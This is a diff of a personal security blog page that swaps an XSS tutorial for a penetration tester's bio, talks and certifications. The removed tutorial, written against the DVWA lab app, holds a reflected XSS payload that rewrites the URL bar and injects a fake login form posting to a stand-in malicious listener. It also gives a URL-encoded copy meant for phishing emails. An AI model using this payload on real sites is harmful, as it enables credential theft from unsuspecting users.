@@ -16,47 +16,41 @@
       </div>
         <span style="font-size:30px;cursor:pointer" onclick="openNav()">&#9776;</span>
     
-        <div class="container">
-            <div class="blog-header">
-                <h1 class="blog-title">The Bootstrap Blog</h1>
-                <p class="lead blog-description">The official example template of creating a blog with Bootstrap.</p>
-              </div>
-        
+        <div class="container">      
               <div class="row">
-        
                 <div class="col-sm-8 blog-main">
                     <div class="blog-post">
-                        <h2 class="blog-post-title">XSS UI Redirection</h2> 
-                        <h3>Moving Beyond alert('xss')</h3>           
-                        <p>Most people know all about making an alert box pop or getting a cookie sent to an external site with document.cookie. It makes since, it is easy to demo and for the most part makes for a great proof of concept.</p>
-                        <p>Unfortunately these sometimes fail to showcase some of the more potentially devious outcomes from having a site that is vulnerable to XSS.</p>
-                        <p>I recently came across a form of XSS that is called ui redressing. As I researched and learned more about it I came to see how malicious a XSS attack could be.</p>
+                        <h2 class="blog-post-title">My work, 2 lines.</h2> 
+                        <p>In my day to day I work as an internal penetration tester for a large conglomerate.<br />Additionally I work closly witht he IR and hunt teams to offer an attackers perspective.  </p>
                         <hr>
-                        <h3>What is UI Redressing?</h3>
-                        <p>Redressing leverages features of html5 to call the history.replaceState or history.pushState functions to the browser. These functions allow a script to re-write what is presented in the URL bar after a page has loaded.</p>
-                        <p>A script, rewrites the url presented in the address bar after loading the page. I'll let that sink in for a minute. I first came across this method randomly on <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#ui-redressing>swisskeyrepo/PayloadsAllTheThings</a> xss injection GitHub page.</p>
-                        <p>From the example on the swisskyrepo's page history.replaceState() is leveraged to replace the page with a /login.</p>
-                        <p><i>Note: history.pushState() could also be used.</i></p>
-                        <p>When the script is ran the url bar will be re-written from:</p>
-                        <pre><code>http://dvwa/vulnerabilities/xss_r/?name=yogi#</code></pre>
-                        <p>to something a bit more devious:</p>
-                        <pre><code>http://dvwa/login</code></pre>
-                        <p>So what? Whats the big deal, the url is re-written but the page is still the page it should be. Right? Maybe, unless the page gets changed with the document.body.innerHTML property....</p>
-                        <hr>
-                        <h3>In Practice</h2>
-                        <p>Up until this point we have seen how UI redressing can be used to change the address bar. Let's leverage that and also re-write the html page to something a little bit more fitting of a login url. Using the script below we can change the URL to http://dvwa/login and also create a new html page for it with document.body.innerHTML.</p>
-                        <pre><code>&lt;script&gt;<br />history.replaceState(null, null, '../../../login');<br />document.body.innerHTML = &quot;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;h2&gt;Please login to acces<br />s secure portion of our site.&lt;/h2&gt;&lt;form action='http://SomeMaliciousListener'&gt;Usernam<br />e: &lt;input type='text'&gt;Password: &lt;input type='password'&gt;&lt;input value='submit' type='su<br />bmit'&gt;&lt;/form&gt;&quot;<br />&lt;/script&gt;</code></pre>
-                        <p>That's it. We can send a Phishing email with a url that is vulnerable to a reflected XSS and include that code as our payload. 
-                        </p>
-                        <pre><code>http://dvwa/vulnerabilities/xss_r/?name=&lt;script&gt;history.replaceState(null, null, '../../../login');document.body.innerHTML = &quot;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;h2&gt;Please login to access secure portion of our site.&lt;/h2&gt;&lt;form action='http://SomeMaliciousListener'&gt;Username: &lt;input type='text'&gt;Password: &lt;input type='password'&gt;&lt;input value='submit' type='submit'&gt;&lt;/form&gt;&quot;&lt;/script&gt;</code></pre>
-                        <p>Even though the page that is expected to load looks similar to this:</p>
-                        <img src="/images/xssuiredressing1.png" alt="UI Redressing 1" style="width:100%"><br />
-                        <br /><p>When the victim clicks the link the login page below will load:</p>
-                        <img id="myImg" src="/images/xssuiredressing2.png" alt="UI Redressing 2" style="width:100%">
-                        <br /><p>What about site certificates? It is not a problem. The victim is still on the real site. They are just at a destination that does not really exist except for them. </p>
-                        <p>Wont they notice something weird about the url? Perhaps, I do not recommend sending a url that is full of html and javascript code. URL encoding it to something like this is much more favorable. </p>
-                        <pre><code>http://dvwa/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%3e%68%69%73%74%6f%72%79%2e%72%65%70%6c%61%63%65%53%74%61%74%65%28%6e%75%6c%6c%2c%20%6e%75%6c%6c%2c%20%27%2e%2e%2f%2e%2e%2f%2e%2e%2f%6c%6f%67%69%6e%27%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%69%6e%6e%65%72%48%54%4d%4c%20%3d%20%22%3c%2f%62%72%3e%3c%2f%62%72%3e%3c%2f%62%72%3e%3c%2f%62%72%3e%3c%2f%62%72%3e%3c%63%65%6e%74%65%72%3e%3c%68%32%3e%50%6c%65%61%73%65%20%6c%6f%67%69%6e%20%74%6f%20%61%63%63%65%73%73%20%73%65%63%75%72%65%20%70%6f%72%74%69%6f%6e%20%6f%66%20%6f%75%72%20%73%69%74%65%2e%3c%2f%68%32%3e%3c%66%6f%72%6d%20%61%63%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%53%6f%6d%65%4d%61%6c%69%63%69%6f%75%73%4c%69%73%74%65%6e%65%72%27%3e%55%73%65%72%6e%61%6d%65%3a%20%3c%69%6e%70%75%74%20%74%79%70%65%3d%27%74%65%78%74%27%3e%50%61%73%73%77%6f%72%64%3a%20%3c%69%6e%70%75%74%20%74%79%70%65%3d%27%70%61%73%73%77%6f%72%64%27%3e%3c%69%6e%70%75%74%20%76%61%6c%75%65%3d%27%73%75%62%6d%69%74%27%20%74%79%70%65%3d%27%73%75%62%6d%69%74%27%3e%3c%2f%66%6f%72%6d%3e%22%3c%2f%73%63%72%69%70%74%3e</code></pre>
-                        <p>This url looks much more 'official'. I imagine most people would see this url and think: <i>"oh, just your typical super long url, much be official. Let me check my training. Yup goes to the domain I expect, yup certificate is valid, must be a real site. Safe to login."</i> I think that the long url lends itself towards being perceived as more legitimate.</p>
+                        <h3>Talks and Workshops</h3>           
+                        <p>Talks:
+                        <ul><li>2019 BsidesKC - <a href="https://www.youtube.com/watch?v=szhqPgBM5vQ&list=PLWPSNJXUawzjIQa8v9Fvn6Aj-kBNuhKiK&index=18">XSS UI Redressing</a></li></ul>
+                      </p>
+
+                      <p>Workshops:
+                        <ul><li>2018 OzSec, Kansas - Held the all day hands on 'hacking workshop' which covered an introduction to offensive security tools</li></ul>
+                      </p>
+                      <hr>
+                      <h3>Certifications</h3>
+                      <p>
+                        <ul>
+                          <li>AWS Solution Architect - Associate</li>
+                          <li>GPEN</li>
+                          <li>CISSP</li>
+                          <li>Security+</li>
+                          <li>Microsoft Office User Specialist (MOUS) - Access 2000</li>
+                        </ul>
+                      </p>
+                      <hr>
+                      <h3>Continuing Education</h3>
+                      <p>
+                        <ul>
+                          <li>SANS: SEC642 Advanced Web Application Penetration Testing</li>
+                          <li>SANS: SEC560 Network Penetration Testing and Ethical Hacking</li>
+                          <li>SANS: ICS410 ICS/SCADA Security Essentials</li>
+                        </ul>
+                      </p>
                     </div><!-- /.blog-post -->
                 </div><!-- /.blog-main -->
             </div><!-- /.row -->
